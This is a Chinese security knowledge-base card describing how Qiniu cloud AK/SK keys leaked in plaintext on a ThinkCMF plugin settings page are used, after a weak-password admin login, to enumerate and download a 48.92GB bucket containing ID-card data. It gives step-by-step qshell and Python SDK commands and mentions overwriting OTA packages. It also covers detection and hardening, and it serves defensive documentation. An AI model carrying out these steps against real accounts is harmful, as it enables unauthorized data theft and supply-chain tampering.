---
id: cloud-cloud-iam-thinkcmf-qiniu-ak-sk-bucket-takeover
title: ThinkCMF 后台插件设置泄露七牛云 AK/SK：qshell/SDK 验证后接管 48.92GB 存储空间并跨子域读取文件
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: cms-plugin-config-qiniu-aksk-bucket-takeover
tags:
- cloud
- qiniu
- ak-sk
- object-storage
- thinkcmf
- credential-leak
- bucket
- data-exposure
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T07:46:45+08:00'
  notes: 已对照原文与全部20张图核对：ThinkCMF后台插件设置明文回显七牛AK/SK/空间域名/空间名称/存储区域（图07）、插件列表掩码（图08）、控制台3724文件/48.92GB/多目录（图09）、文中跨子域与身份证PII描述均一致。原文未给出qshell/SDK具体命令，卡片为等价复现；AK/SK已脱敏。未验证点：未连接七牛API；原文未标注ThinkCMF版本，未设affected_versions；frontmatter无source_url。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-thinkcmf-qiniu-ak-sk-bucket-takeover/
draft: false
kb_aliases:
- 七牛云 AK/SK 泄露
- ThinkCMF 七牛插件密钥泄露
- qshell 接管存储空间
- 七牛云 bucket 遍历
- CMS 后台配置泄露云存储密钥
---

## 一句话结论

ThinkCMF 后台的七牛云插件设置页以明文保存 AccessKey/SecretKey、空间域名、空间名称与存储区域；拿到后台（本例为弱口令）后即可读取这些长期密钥，用 qshell/七牛 SDK 验证有效后直接列举并下载该账号下 3724 个文件、48.92GB 的存储空间，且桶内包含根域其他子域名的文件，形成跨子域的云存储数据接管。

## 原理

- 七牛云等对象存储使用 AccessKey/SecretKey 对每个 API 请求做签名，AK/SK 是长期身份凭据；一旦泄露，攻击者无需进入目标网络即可直接调用对象存储 API，权限等同于该密钥所属账号/子账号。
- ThinkCMF 的七牛云插件把 `AccessKey`、`SecretKey`、`域名协议`、`空间域名`、`空间名称`、`存储区域` 等配置保存在后台插件设置中。插件列表页对 AK/SK 做了 `***` 掩码，但「插件设置」表单会回填明文；只要能进入后台（本例通过 admin 弱口令），就能直接看到完整密钥。
- 密钥的有效性验证：
  - 用 qshell `qshell account <AK> <SK> <name>` 配置账号后执行 `qshell buckets` 列出账号下的 bucket；能列出即密钥有效且有列举权限。
  - 或用七牛 Python SDK 的 `Auth(ak, sk)` + `BucketManager.list_buckets()`；对具体 bucket 调 `list()` 枚举对象、`stat`/下载 URL 验证读权限。
- 本例桶规模：控制台显示「共 3724 个文件、共 48.92 GB 存储量」，目录包含 `apcs`、`car`、`commercial`、`core`、`dev`、`device`、`fastdoc-img`、`file`、`image`、`img`、`mall`、`ota`、`product`、`typeface`、`ucenter`、`upload`、`version` 等，明显不止一个站点使用；文章判断根域下多个子域名的云文件都放在该账号下，另外还有约 10GB 的桶。
- 危害升级：桶中除业务图片/安装包外，后续还发现大量身份证等个人信息；云存储密钥泄露因此不仅是「文件被读」，还可能造成批量 PII 泄露、文件被篡改/删除（取决于密钥权限）与供应链投毒（替换 OTA/安装包）。
- 为什么常见：CMS 插件为了简化配置，把长期 AK/SK 明文存在数据库/配置文件，后台表单回显；管理员弱口令 + 插件配置页未做二次鉴权/掩码，两个弱点叠加即泄露。

## 触发条件

- 目标使用 ThinkCMF（或其他 CMS）并启用七牛云/对象存储插件，后台插件设置中保存长期 AK/SK。
- 攻击者能进入后台（弱口令、默认口令、SQL 注入、越权等），或通过配置泄露/备份/前端 JS 拿到同一组密钥。
- 密钥仍有效、未绑定源 IP/未启用 MFA、未限制权限；账号具备 `list_buckets`、`list`、`download` 等权限。
- Bucket 中存有真实业务数据（图片、安装包、OTA、报表、证件等）；若只有测试文件，危害降级。

## 利用步骤

1. 进入 ThinkCMF 后台（本例 admin 弱口令），打开「插件中心 → 七牛云 → 插件设置」，记录 `AccessKey`、`SecretKey`、空间域名、空间名称、存储区域。
2. 用 qshell 配置并验证：
   ```bash
   qshell account <AK> <SK> qiniu-test
   qshell buckets
   ```
   或 Python：
   ```python
   from qiniu import Auth, BucketManager
   q = Auth("<AK>", "<SK>")
   bm = BucketManager(q)
   print(bm.buckets())
   ```
3. 对目标 bucket 列举对象（按前缀/目录），统计文件数与总大小；文章控制台显示 3724 个文件、48.92GB。
4. 抽样下载业务文件验证读权限与数据类型；对图片/文档/压缩包做分类，重点找报表、备份、证件、OTA/安装包。
5. 评估跨子域影响：同一 bucket 下的目录可能对应根域不同子域名；检查是否存在可写的 OTA/安装包目录（若有写权限可进一步投毒，但需授权并谨慎）。
6. 报告中保留 bucket 列表/对象列表/文件大小作为证据，PII 打码，避免全量下载。

## PoC

后台插件设置泄露的字段（原文截图，值已脱敏）：

```text
AccessKey: 8f****************************A
SecretKey: R2****************************P
域名协议: http
空间域名: imgs.******.com
空间名称: ******
存储区域: 华南
```

qshell 验证：

```bash
qshell account 8f****************************A R2****************************P qiniu-test
qshell buckets
qshell listbucket <bucket> -o list.txt
```

Python SDK 验证：

```python
from qiniu import Auth, BucketManager
q = Auth("8f...A", "R2...P")
bm = BucketManager(q)
for b in bm.buckets():
    print(b["name"], b.get("region"))
# 列举对象
ret, eof, info = bm.list("bucket-name", prefix="", marker="", limit=1000)
print(ret)
```

控制台证据：桶内 3724 个文件、48.92GB，目录含 `apcs`、`car`、`image`、`ota`、`product`、`upload`、`version` 等；说明同一账号承载多站点文件。

## 变体与关联

- 同类云密钥泄露卡：`cloud/cloud-iam` 下「未授权接口泄露阿里云 OSS AK/SK：oss2 验证、Bucket 枚举与 PII 取证」「Nacos 配置详情泄露阿里云 OSS AK/SK」「前端 JS 泄露阿里云长期 AK/SK」等；本卡差异是 **ThinkCMF 插件设置明文回显 + 七牛云 qshell/SDK**，提供商与泄露入口不同，利用链同为「AK/SK → bucket 列举 → 数据取证」。
- 本文章还发现阿里大于短信 AppKey/AppSecret、微信小程序 AppID/AppSecret 泄露，但这些只停留在配置页，未展示实际发送短信/获取 access_token 的利用结果，故不单独建卡（可在拿到后台后作为进一步凭据收集项）。
- 若 AK/SK 具备写权限，可进一步上传/覆盖对象（OTA、安装包、前端 JS）形成供应链投毒；是否可写需用 `stat`/上传测试确认，禁止在未授权环境验证。

## 检测与防御

- 修复：不要把长期 AK/SK 明文存进 CMS 插件配置；使用 STS 临时凭据/子账号最小权限，按 bucket/前缀限制读写，绑定源 IP、设置过期与轮换；后台插件设置页对密钥二次鉴权、只显示掩码、不回填明文。
- 访问控制：后台强口令 + MFA；限制插件配置页仅超级管理员可见；数据库/配置文件加密与访问审计。
- 云侧：为每个站点分配独立 bucket/子账号；关闭不必要的 `list_buckets` 权限；开启对象存储访问日志与异常下载告警；定期轮换密钥并检查泄露。
- 检测：监控后台插件设置页的访问与 AK/SK 查看行为；云审计中关注 `ListBuckets`/`ListObjects`/批量下载；对同一 AK 从异常 IP/非业务地域访问告警。
- 排查：核对七牛云账号的 AK 列表、bucket 列表、访问日志与最近下载来源；确认是否存在未知子账号/密钥。
